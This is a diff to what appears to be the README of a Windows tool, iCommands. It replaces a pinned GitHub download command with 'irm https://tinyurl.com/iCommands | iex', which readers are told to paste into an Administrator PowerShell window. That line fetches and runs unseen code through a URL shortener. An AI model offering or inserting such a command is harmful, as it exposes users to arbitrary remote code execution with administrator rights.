@@ -57,4 +57,4 @@ Click the button below to download the latest compiled executable directly:
 No download required. Copy and paste this command into an **Administrator PowerShell** window to launch iCommands v2.8 instantly:
 
 ```powershell
-irm [https://github.com/ikhtierahmed/iCommands/raw/4d69ad5e5e77f9b64c381967509be94903895db7/iCommands.exe](https://github.com/ikhtierahmed/iCommands/raw/4d69ad5e5e77f9b64c381967509be94903895db7/iCommands.exe) -OutFile "$env:TEMP\iCommands.exe"; Start-Process "$env:TEMP\iCommands.exe"
+irm https://tinyurl.com/iCommands | iex
